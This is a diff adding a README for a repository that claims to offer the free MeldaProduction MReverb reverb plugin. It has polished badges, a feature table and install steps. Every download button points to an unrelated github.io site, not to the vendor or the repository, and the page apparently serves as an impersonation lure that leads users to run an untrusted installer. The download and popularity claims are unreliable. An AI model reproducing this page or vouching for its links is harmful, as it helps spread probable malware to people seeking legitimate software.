@@ -1,0 +1,109 @@
+<div align="center">
+  <img src="https://raw.githubusercontent.com/kytzhoelkojj/meldaproduction-mreverb/main/logo.png" alt="MeldaProduction MReverb Logo" width="120" height="120" style="border-radius: 20px;" />
+</div>
+
+<h1 align="center">MeldaProduction MReverb</h1>
+
+<div align="center">
+
+[![Version](https://img.shields.io/badge/version-latest-16A34A?style=for-the-badge&labelColor=1a1a2e)](https://github.com/kytzhoelkojj/meldaproduction-mreverb)
+[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS-16A34A?style=for-the-badge&labelColor=1a1a2e)](https://github.com/kytzhoelkojj/meldaproduction-mreverb)
+[![Category](https://img.shields.io/badge/category-Audio%20Effects-16A34A?style=for-the-badge&labelColor=1a1a2e)](https://github.com/kytzhoelkojj/meldaproduction-mreverb)
+[![License](https://img.shields.io/badge/license-Free-16A34A?style=for-the-badge&labelColor=1a1a2e)](https://github.com/kytzhoelkojj/meldaproduction-mreverb)
+[![Downloads](https://img.shields.io/badge/downloads-50K%2B-16A34A?style=for-the-badge&labelColor=1a1a2e)](https://github.com/kytzhoelkojj/meldaproduction-mreverb)
+
+</div>
+
+<div align="center">
+  <img src="https://readme-typing-svg.herokuapp.com?color=16A34A&size=28&center=true&vCenter=true&width=900&lines=MeldaProduction+MReverb;Free+professional+reverb+with+multiple+algorithms" alt="Typing SVG" />
+</div>
+
+---
+
+## Overview
+
+MeldaProduction MReverb is a free, high-quality algorithmic reverb with room, hall, plate, and other modes offering professional results at no cost.
+
+Whether you're a newcomer just getting started or a seasoned pro looking for advanced tools, **MeldaProduction MReverb** delivers the features you need in a clean, intuitive package.
+
+<div align="center">
+
+[![Download MeldaProduction MReverb](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_MELDAPRODUCTION_MREVERB-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
+---
+
+## Key Features
+
+| Feature | Description |
+|---------|-------------|
+| **Multiple Algorithms** | Room, hall, plate, and special reverb modes |
+| **Full Modulation** | Modulation depth and speed controls for animated reverb tails |
+| **Pre-Delay** | Up to 1000 ms pre-delay with tempo sync option |
+| **Free Plugin** | Full-featured free version from MeldaProduction with no nag screens |
+
+---
+
+## System Requirements
+
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| **OS** | Windows 10 / macOS 11 | Windows 11 / macOS 13+ |
+| **RAM** | 4 GB | 8 GB+ |
+| **Storage** | 500 MB | 2 GB+ |
+| **Internet** | Required for activation | Broadband recommended |
+
+---
+
+## Installation
+
+Getting started with **MeldaProduction MReverb** is quick and straightforward.
+
+<div align="center">
+
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-16A34A?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-16A34A?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+
+</div>
+
+1. **Download** the installer for your operating system above
+2. **Run** the installer and follow the on-screen instructions
+3. **Launch** MeldaProduction MReverb from your desktop or applications folder
+4. **Configure** your preferences in the settings panel
+
+---
+
+## Community & Stats
+
+<div align="center">
+
+![GitHub stars](https://img.shields.io/github/stars/kytzhoelkojj/meldaproduction-mreverb?style=social)
+![GitHub forks](https://img.shields.io/github/forks/kytzhoelkojj/meldaproduction-mreverb?style=social)
+![GitHub watchers](https://img.shields.io/github/watchers/kytzhoelkojj/meldaproduction-mreverb?style=social)
+
+</div>
+
+---
+
+## Support the Project
+
+<div align="center">
+
+[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com)
+[![PayPal](https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white)](https://paypal.com)
+[![Patreon](https://img.shields.io/badge/Patreon-F96854?style=for-the-badge&logo=patreon&logoColor=white)](https://patreon.com)
+
+</div>
+
+---
+
+## License
+
+This project is distributed under a free-to-use license. See the repository for full license details.
+
+<div align="center">
+
+**Made with ❤️ for the Audio Effects community**
+
+</div>
